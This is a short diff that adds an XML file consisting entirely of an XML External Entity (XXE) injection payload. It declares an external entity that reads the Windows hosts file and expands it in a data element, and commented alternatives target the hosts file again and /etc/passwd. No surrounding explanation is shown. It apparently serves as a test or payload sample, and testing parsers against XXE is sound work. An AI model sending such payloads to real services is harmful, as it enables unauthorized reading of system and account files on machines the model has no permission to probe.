@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+]>
+<data>
+  <info>&xxe;</info>
+</data>
+
+<!-- <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> -->
+<!-- <!ENTITY xxe SYSTEM "file:///etc/passwd"> -->
